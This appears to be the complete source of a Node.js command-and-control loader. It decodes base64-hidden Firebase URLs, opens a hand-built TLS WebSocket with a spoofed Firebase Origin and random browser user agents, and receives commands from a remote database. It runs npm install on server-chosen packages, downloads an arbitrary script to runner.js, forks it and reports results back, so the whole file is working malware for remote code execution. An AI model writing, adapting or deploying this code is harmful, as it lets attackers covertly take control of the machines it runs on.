const fs = require('fs')
const tls = require('tls')
const { execSync, fork } = require('child_process')

const windowsTokens = [
    'Windows NT 10.0; Win64; x64',
    'Windows NT 10.0; Win64; x86',
    'Windows NT 10.0; WOW64',
    'Windows NT 10.0; Win64',
    'Windows NT 10.0; x64; rv:99.0',
    'Windows 11; Win64; x64',
    'Windows NT 10.0; Win64; x64; Windows 11',
    'Windows 11; WOW64; Win64',
    'Windows 11; x64; rv:100.0'
]

let id = 1
let mCmd = null
let mSendData = null
let mScript = null
let DATABASE = null
let CONNECTION = null
let USER = getUserName()
let FINISH = new Date().getTime()+21000000

startServer()

setInterval(() => {
    sendPing(CONNECTION)
}, 30000)

setInterval(async () => {
    await checkStatus()
}, 300000)


async function startServer() {
    console.log('Node: ---START-SERVER---')

    let module = await onModuleDetails()
    if (!module) {
        console.log('---PROCESS-CLOSE---')
        process.exit(0)
    }

    await checkStatus()
    
    await runDynamicServer(module)
}

async function onModuleDetails() {
    try {
        let data = await getAxios(decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91L3J1bm5pbmcv')+USER+'.json')

        if (data && data.module) {
            let database = await getAxios(decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91L2RhdGFiYXNlLw==')+data.database+'.json')
            
            if (database) {
                DATABASE = getQueryParam(database, 'ns')
                await runWebSocket(new URL(database))
            }

            let module = await getAxios(decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91L21vZHVsZS8=')+data.module+'.json')
            
            if (module) {
                return module
            }
        }
    } catch (error) {}

    return null
}

async function runWebSocket(url) {
    let host = url.hostname
    let port = 443
    let path = url.pathname + url.search
    let cmd = "/£uck々you/realtime/"+USER+"/cmd"

    let socket = tls.connect({ host, port, servername: host }, () => {
        socket.write(`GET ${path} HTTP/1.1\r\nHost: ${host}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Key: ${randomWebSocketKey()}\r\nSec-WebSocket-Version: 13\r\nOrigin: https://console.firebase.google.com\r\nUser-Agent: ${randomUserAgent()}\r\n\r\n`);
        sendWSMessage(socket, JSON.stringify({"t":"d","d":{"r":id++,"a":"om","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}, "s":0}}}}))
        sendWSMessage(socket, JSON.stringify({"t":"d","d":{"r":id++,"a":"q","b":{"p":cmd,"h":""}}}))
        CONNECTION = socket
    })

    socket.on('data', (data) => {
        try {
            let firstByte = data[0]
            let opcode = firstByte & 0x0f

            if (opcode === 0x1) {
                let secondByte = data[1]
                let length = secondByte & 0x7f

                let offset = 2
                if (length === 126) {
                    length = data.readUInt16BE(offset)
                    offset += 2
                } else if (length === 127) {
                    length = data.readBigUInt64BE(offset)
                    offset += 8
                }

                let payload = data.slice(offset, offset + length)
                let message = payload.toString('utf8')

                try {
                    let json = JSON.parse(message)
                    
                    if (json.d && json.d.b) {
                        let data = json.d.b
                        if (data && data.p && data.d && cmd.includes(data.p)) {
                            if (mSendData) {
                                if (mSendData != data.d) {
                                    if (mScript) {
                                        mScript.send(data.d)
                                    } else {
                                        mCmd = data.d
                                    }
                                }
                            } else {
                                if (mScript) {
                                    mScript.send(data.d)
                                } else {
                                    mCmd = data.d
                                }
                            }
                        }
                    }
                } catch (err) {}
            }
        } catch (err) {}
    })

    
    socket.on('end', () => {
        CONNECTION = null
        setTimeout(async () => {
            await runWebSocket(url)
        }, 3000)
    })

    socket.on('error', (err) => {
        CONNECTION = null
        socket.destroy()
    })
}

function sendWSMessage(socket, message) {
    try {
        if (!socket || socket.destroyed) {
            return false
        }

        let payload = Buffer.from(message, 'utf8')
        let frame = Buffer.alloc(2 + 4 + payload.length)
        frame[0] = 0x81
        frame[1] = 0x80 | payload.length

        let mask = []
        for (let i = 0; i < 4; i++) mask.push(Math.floor(Math.random() * 256))
        for (let i = 0; i < 4; i++) frame[2 + i] = mask[i]

        for (let i = 0; i < payload.length; i++) {
            frame[6 + i] = payload[i] ^ mask[i % 4]
        }

        socket.write(frame)
        
        return true
    } catch (error) {
        return false
    }
}

function sendPing(socket) {
    try {
        if (!socket || socket.destroyed) {
            return false
        }

        let payload = Buffer.from([0])
        let frame = Buffer.alloc(2 + 4 + payload.length)

        frame[0] = 0x89
        frame[1] = 0x80 | payload.length

        let mask = []
        for (let i = 0; i < 4; i++) mask.push(Math.floor(Math.random() * 256))
        for (let i = 0; i < 4; i++) frame[2 + i] = mask[i]

        for (let i = 0; i < payload.length; i++) {
            frame[6 + i] = payload[i] ^ mask[i % 4]
        }

        socket.write(frame)
        
        return true
    } catch (error) {
        return false
    }
}


async function checkStatus() {
    if (FINISH > 0 && FINISH < new Date().getTime()) {
        
        if (!sendWSMessage(CONNECTION, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}, "s":0}}}}))) {
            try {
                await patchFetch('https://'+DATABASE+decode('LmZpcmViYXNlaW8uY29tLyVDMiVBM3VjayVFMyU4MCU4NXlvdS91c2VyLw==')+USER+'.json', { "t": Date.now(), "s":0 }, {
                    'Content-Type': 'application/json'
                })
            } catch (error) {}
        }

        console.log('---COMPLETED---')
        process.exit(0)
    } else {
        if (!sendWSMessage(CONNECTION, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/user/"+USER,"d":{"t":{".sv":"timestamp"}, "s":1}}}}))) {
            try {
                await patchFetch('https://'+DATABASE+decode('LmZpcmViYXNlaW8uY29tLyVDMiVBM3VjayVFMyU4MCU4NXlvdS91c2VyLw==')+USER+'.json', { "t": Date.now(), "s":1 }, {
                    'Content-Type': 'application/json'
                })
            } catch (error) {}
        }
    }
}

async function runDynamicServer(data) {
    try {
        const packages = data.install.split(' ')
        const missingPackages = []

        for (let pkg of packages) {
            try {
                require.resolve(pkg)
            } catch {
                missingPackages.push(pkg)
            }
        }

        if (missingPackages.length > 0) {
            console.log('Node: ---INSTALLING-PACKAGE---')
            execSync(`npm install ${missingPackages.join(" ")}`)
            console.log('Node: ---INSTALLATION-SUCCESS---')
        }

        let fileExists = fs.existsSync('runner.js')

        if (!fileExists) {
            console.log('Node: ---DOWNLOADING-SCRIPT---')
            let script = await getAxios(data.script)

            if (script) {
                fs.writeFileSync('runner.js', script, 'utf8')
                console.log('Node: ---SCRIPT-DOWNLOAD-COMPLETE---')
            } else {
                console.log('Node: ---SCRIPT-DOWNLOAD-FAILED---')
            }
        } else {
            console.log('Node: ---SCRIPT-FOUND---')
        }

        console.log('Node: ---RUNNING-SCRIPT---')
        
        mScript = fork('./runner.js', [USER])

        if (mCmd) {
            mScript.send(mCmd)
        }

        mScript.on('message', (data) => {
            mSendData = data
            sendWSMessage(CONNECTION, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/realtime/"+USER,"d":{"cmd": data}}}}))
        })
    } catch (error) {
        console.log('Node: ---SCRIPT-RUNNING-ERROR---')
    }
}


async function getAxios(url, options = {}) {
    try {
        const response = await fetch(url, options)
        if (!response.ok) return null

        const contentType = response.headers.get('content-type')
        if (contentType && contentType.includes('application/json')) {
            return await response.json()
        } else {
            return await response.text()
        }
    } catch (err) {
        return null
    }
}

async function patchFetch(url, data, headers = {}) {
    try {
        let res = await fetch(url, {
            method: 'PATCH',
            headers: { ...headers },
            body: JSON.stringify(data)
        })

        let json = await res.json()
        return json
    } catch (err) {
        throw null
    }
}

function getQueryParam(url, param) {
    let match = url.match(new RegExp(`[?&]${param}=([^&]+)`))
    return match ? match[1] : null
}


function getUserName() {
    try {
        let directory = __dirname.split('\\')
        if (directory.length > 1) {
            let name = directory[directory.length-1]
            if (name) {
                return name
            }
        }
    } catch (error) {}

    try {
        let directory = __dirname.split('/')
        if (directory.length > 1) {
            let name = directory[directory.length-1]
            if (name) {
                return name
            }
        }
    } catch (error) {}

    return null
}

function randomWebSocketKey() {
    let arr = []
    for (let i = 0; i < 16; i++) {
        arr.push(Math.floor(Math.random() * 256))
    }
    let binary = String.fromCharCode(...arr)
    return Buffer.from(binary, 'binary').toString('base64')
}

function randInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomUserAgent() {
    let os = windowsTokens[randInt(0, windowsTokens.length - 1)]
    let major = randInt(112, 141)
    let chromeVer = `${major}.0.0.0`
    return `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVer} Safari/537.36`
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('utf-8')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
